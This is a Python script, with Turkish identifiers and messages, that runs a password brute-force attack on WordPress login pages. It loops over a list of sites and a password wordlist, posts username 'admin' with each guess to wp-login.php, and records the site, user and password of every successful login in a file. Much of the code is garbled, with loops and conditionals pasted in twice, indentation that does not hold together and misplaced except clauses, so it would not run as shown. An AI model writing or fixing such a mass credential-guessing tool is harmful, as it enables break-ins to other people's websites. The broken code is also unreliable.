import requests


kullaniciadi=['admin']
girisyapilansiteler=open("girisyapilansiteler.txt","w")

def bruteforce():
print("Default Kullanıcı Adı admin'dir.\n")
        try:
            dizin = input("Şifrelerin Olduğu Dizini Giriniz: ")
            siteler = []
            oku = open("siteler.txt", "r")
            sitelerioku = oku.readlines()
            sifrelerr = []
            sifrelerioku = open(dizin, "r")
            sifreoku = sifrelerioku.readlines()
            oku=open("siteler.txt","r")
            sifrelerioku=open(dizin,"r")
            sifreoku=sifrelerioku.readlines()
    for i in sifreoku:
                sifrelerr.append(i.replace("\n", ""))
            for websiteleri in sitelerioku:
                siteler.append(websiteleri.replace("\n", "") + "wp-login.php")
            print("Bütün Siteler Eklendi!\n")
        for i in sifreoku:
            sifrelerr.append(i.replace("\n", ""))
            for websiteleri in sitelerioku:
                siteler.append(websiteleri.replace("\n", "") + "wp-login.php")
                 for x in siteler:
                for i in sifrelerr:
                    try:
                        payload = {'log': kullaniciadi, 'pwd': i}
                        r = requests.get(x, timeout=4)
                        if r.status_code == 200 and "pwd" in r.text:
                            r = requests.post(x, data=payload, timeout=4)
                            for x in siteler:
                for i in sifrelerr:
                    try:
                        payload = {'log': kullaniciadi, 'pwd': i}
                        r = requests.get(x, timeout=4)
                        if r.status_code == 200 and "pwd" in r.text:
                            r = requests.post(x, data=payload, timeout=4)
                            r = requests.get(x, timeout=4)
                             if r.status_code == 200 and "pwd" in r.text:
                            r = requests.post(x, data=payload, timeout=4)
                            if r.status_code == 200
                                and "pwd" in r.text:
                                    r = requests.post(x, data=payload, timeout=4)
if "Bağlanmayı Reddetti" in r.text:
                                break
                            if "Insecure Login Prevented" in r.text:
                                break
                            if "Invalid username" in r.text:
                                print("Kullanıcı Adı Hatalı.")
                                break
                            if "Log Out" in r.text or "Log out" in r.text:
                                print("Giriş Başarılı:", x + ":" + kullaniciadi + ":" + i)
                                girisyapilansiteler.write("Siteler:\n" + "Kullanıcı Adı:" + " " + " " + "Sifreler:")
                                girisyapilansiteler.write("\n" + x + "admin" + " " + " " + i)
                                break

                            else:
                                print("Hatalı Şifre!", x, i)
                                continue
                                if "Bağlanmayı Reddetti" in r.text:
                                break
                            if "Insecure Login Prevented" in r.text:
                                break
                            if "Invalid username" in r.text:
                                print("Kullanıcı Adı Hatalı.")
                                break
                                if "Log Out" in r.text or "Log out" in r.text:
                                print("Giriş Başarılı:", x + ":" + kullaniciadi + ":" + i)
                                girisyapilansiteler.write("Siteler:\n" + "Kullanıcı Adı:" + " " + " " + "Sifreler:")
                                girisyapilansiteler.write("\n" + x + "admin" + " " + " " + i)
                                break
                            else:
                            print("Siteye Bağlanılamıyor. Veya IP Blok Yendi.", x)
                            break
                    except:
                        continue
        except:
            print("Dizin Girmediniz...")
            exit()
            except:
except:
            print("Dizin Girmediniz...")
            exit()
bruteforce()

